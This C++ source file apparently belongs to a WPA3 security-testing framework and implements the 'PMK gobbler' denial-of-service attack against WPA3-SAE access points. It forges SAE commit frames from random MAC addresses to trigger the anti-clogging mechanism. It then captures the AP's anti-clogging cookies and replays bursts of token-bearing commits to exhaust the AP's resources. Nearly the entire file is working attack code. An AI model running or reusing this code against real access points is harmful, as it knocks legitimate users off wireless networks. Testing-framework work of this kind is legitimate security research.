#include "attacks/DoS_hard/PMK_gobbler/pmk_gobbler.h"

#include <tins/tins.h>
#include <poll.h>
#include <cerrno>
#include <thread>
#include <chrono>

#include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
#include "ex_program/external_actors/ExternalConn.h"
#include "logger/log.h"
#include "observer/resource_checker.h"
#include "system/hw_capabilities.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::pmk_gobbler {

    static RadioTap make_sae_commit(const HWAddress<6> &ap_mac,
                                    const HWAddress<6> &sta_mac,
                                    dos_helpers::SAEPair sae_params) {
        Dot11Authentication auth;
        auth.addr1(ap_mac);
        auth.addr2(sta_mac);
        auth.addr3(ap_mac);
        auth.type(Dot11::MANAGEMENT);
        auth.subtype(Dot11::AUTH);
        auth.auth_algorithm(3); // SAE
        auth.auth_seq_number(1);
        auth.status_code(0);

        // group 19 (P-256) | optional ACM token | dummy scalar | dummy element
        vector<uint8_t> payload;
        payload.push_back(0x13);
        payload.push_back(0x00);
        payload.insert(payload.end(), sae_params.token.begin(), sae_params.token.end());
        payload.insert(payload.end(), sae_params.scalar.begin(), sae_params.scalar.end());
        payload.insert(payload.end(), sae_params.element.begin(), sae_params.element.end());

        auth.inner_pdu(RawPDU(payload));
        RadioTap rt;
        rt.inner_pdu(auth);
        return rt;
    }

    //TODO add test
    optional<ACMCookie> parse_acm_response(const uint8_t *packet, const uint32_t len) {
        const auto sae = dos_helpers::parse_sae_commit(packet, len);
        if (!sae) return nullopt;
        const uint16_t radiotap_len = *reinterpret_cast<const uint16_t *>(packet + 2);
        if (len < static_cast<uint32_t>(radiotap_len + 10)) return nullopt;

        ACMCookie entry;
        entry.sta_mac = HWAddress<6>(packet + radiotap_len + 4); // addr1 = destination STA
        entry.token   = sae->token;
        return entry;
    }

    // TODO tyhle smyšky s poll jsou hrozné, udělat, nějak je generalizavat a zkrášlit ?
    void capture_cookies(const string &sniff_iface, const HWAddress<6> &ap_mac, CookieStore &store) {
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t *handle = pcap_open_live(sniff_iface.c_str(), 2000, 1, 0, errbuf);
        if (!handle) throw runtime_error("pcap_open_live failed: " + string(errbuf));
        auto handle_guard = unique_ptr<pcap_t, void(*)(pcap_t*)>(handle, pcap_close);

        pcap_setnonblock(handle, 1, errbuf);

        const string filter = "wlan type mgt subtype auth and wlan addr2 " + ap_mac.to_string();
        bpf_program fp{};
        if (pcap_compile(handle, &fp, filter.c_str(), 1, PCAP_NETMASK_UNKNOWN) < 0)
            throw runtime_error("pcap_compile failed: " + string(pcap_geterr(handle)));
        pcap_setfilter(handle, &fp);
        pcap_freecode(&fp);

        const int fd = pcap_get_selectable_fd(handle);
        if (fd == -1) throw runtime_error("pcap fd not selectable");
        pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };

        log(LogLevel::INFO, "Cookie capture started on " + sniff_iface);

        while (!store.stop.load()) {
            const int ret = poll(&pfd, 1, 100);
            if (ret < 0) {
                if (errno == EINTR) continue;
                log(LogLevel::WARNING, "capture poll error: " + to_string(errno));
                break;
            }
            if (ret == 0 || !(pfd.revents & POLLIN)) continue;

            pcap_pkthdr *header;
            const uint8_t *packet;
            while (pcap_next_ex(handle, &header, &packet) == 1) {
                if (auto entry = parse_acm_response(packet, header->caplen)) {
                    lock_guard lock(store.mtx);
                    const auto [it, inserted] = store.queue.insert_or_assign(
                        entry->sta_mac.to_string(), *entry);
                    if (inserted) {
                        log(LogLevel::DEBUG, "Cookie captured for %s, queue size %d",
                            entry->sta_mac.to_string().c_str(), store.queue.size());
                    }
                }
            }
        }
        log(LogLevel::INFO, "Cookie capture stopped");
    }

    ACMCookie trigger_acm(const string &iface,
                      const HWAddress<6> &ap_mac, const int trigger_count, dos_helpers::SAEPair sae_params) {
        PacketSender sender(iface);

        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t *handle = pcap_open_live(iface.c_str(), 2000, 1, 0, errbuf);
        if (!handle) throw runtime_error("pcap_open_live failed: " + string(errbuf));
        auto handle_guard = unique_ptr<pcap_t, void(*)(pcap_t*)>(handle, pcap_close);

        pcap_setnonblock(handle, 1, errbuf);

        const string filter = "wlan type mgt subtype auth";
        bpf_program fp{};
        if (pcap_compile(handle, &fp, filter.c_str(), 1, PCAP_NETMASK_UNKNOWN) < 0)
            throw runtime_error("pcap_compile failed: " + string(pcap_geterr(handle)));
        pcap_setfilter(handle, &fp);
        pcap_freecode(&fp);

        const int fd = pcap_get_selectable_fd(handle);
        if (fd == -1) throw runtime_error("pcap fd not selectable");
        pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };

        log(LogLevel::INFO, "Triggering ACM (max %d frames)...", trigger_count);
        for (int i = 0; i < trigger_count; ++i) {
            auto frame = make_sae_commit(ap_mac, HWAddress<6>(hw_capabilities::rand_mac()), sae_params);
            sender.send(frame);

            const auto deadline = steady_clock::now() + milliseconds(5);
            while (steady_clock::now() < deadline) {
                const int remaining_ms = duration_cast<milliseconds>(deadline - steady_clock::now()).count();
                const int ret = poll(&pfd, 1, max(remaining_ms, 0));
                if (ret < 0) {
                    if (errno == EINTR) continue;
                    log(LogLevel::WARNING, "trigger poll error: "+to_string(errno));
                    break;
                }
                if (ret == 0 || !(pfd.revents & POLLIN)) continue;

                pcap_pkthdr *header;
                const uint8_t *packet;
                while (pcap_next_ex(handle, &header, &packet) == 1) {
                    if (auto cookie = parse_acm_response(packet, header->caplen)) {
                        if(cookie->token.empty()) continue;
                        log(LogLevel::INFO, "ACM confirmed active after "+to_string(i + 1) + " frames");
                        return std::move(*cookie);
                    }
                }
            }
        }
        throw run_err("ACM not activated after " + to_string(trigger_count) + " frames");
    }

    void burst_with_cookies(const string &iface, const HWAddress<6> &ap_mac,
                            CookieStore &store, const int attack_time_sec, const dos_helpers::SAEPair &sae_params) {
        PacketSender sender(iface);
        long long sent     = 0;
        long long next_log = 0;
        const auto end_time = steady_clock::now() + seconds(attack_time_sec);

        log(LogLevel::INFO, "Burst phase started, duration: %ds", attack_time_sec);

        while (steady_clock::now() < end_time) {
            ACMCookie entry;
            {
                lock_guard lock(store.mtx);
                if (store.queue.empty()) {
                    this_thread::sleep_for(milliseconds(10));
                    continue;
                }
                const auto it = store.queue.begin();
                entry = std::move(it->second);
                store.queue.erase(it);
            }

            auto new_sae_params = sae_params;
            new_sae_params.token = entry.token;
            auto frame = make_sae_commit(ap_mac, entry.sta_mac, new_sae_params);

            constexpr size_t BURST_SIZE = 64;
            for (size_t i = 0; i < BURST_SIZE; ++i) {
                sender.send(frame);
                this_thread::sleep_for(nanoseconds(100));
            }
            sent += BURST_SIZE;

            if (sent >= next_log) {
                size_t q_size;
                {
                    lock_guard l(store.mtx);
                    q_size = store.queue.size();
                }
                log(LogLevel::DEBUG, "Sent: %zu, cookies remaining: %d", sent, q_size);
                next_log += 500;
            }
        }

        store.stop.store(true); // signal capture thread to exit
        log(LogLevel::INFO, "Burst done. Total packets sent: %d", sent);
    }

    void run_attack(RunStatus &rs) {
        const ActorPtr ap       = rs.get_actor("access_point");
        const ActorPtr attacker = rs.get_actor("attacker");

        const HWAddress<6> ap_mac(ap["mac"]);
        const string iface       = attacker["iface"];
        const string sniff_iface = attacker["sniff_iface"];

        const auto& att_cfg     = rs.config.at("attack_config");
        const int trigger_count = att_cfg.at("acm_trigger_count").get<int>();
        const int attack_time   = att_cfg.at("attack_time_sec").get<int>();

        const auto ssid = rs.config.at("actors").at("access_point") //TODO should be iin setup_actor
            .at("setup").at("program_config").at("ssid").get<string>();
        const dos_helpers::SAEPair sae_params = cookie_guzzler::get_commit_values(
            rs, attacker["iface"], attacker["sniff_iface"], ssid, ap["mac"], 30);
        attacker->set_monitor_mode();
        attacker->up_iface();

        //  force AP into ACM mode
        ACMCookie first = trigger_acm(iface, ap_mac, trigger_count, sae_params);
        rs.start_observers();
        CookieStore store;
        thread capture_thread([&]() {
            try {
                capture_cookies(sniff_iface, ap_mac, store);
            } catch (const exception &e) {
                log(LogLevel::ERROR, "Capture thread: " + string(e.what()));
                store.stop.store(true);
            }
        });

        try {
            burst_with_cookies(sniff_iface, ap_mac, store, attack_time, sae_params);
        } catch (...) {
            store.stop.store(true);
            if (capture_thread.joinable()) capture_thread.join();
            throw;
        }

        if (capture_thread.joinable()) capture_thread.join();
        ap->conn->disconnect();
    }

    void stats_attack(const RunStatus &rs) {
        const auto ap = rs.config.at("actors").at("access_point");
        observer::resource_checker::create_graph(rs, ap["source"]);
    }

}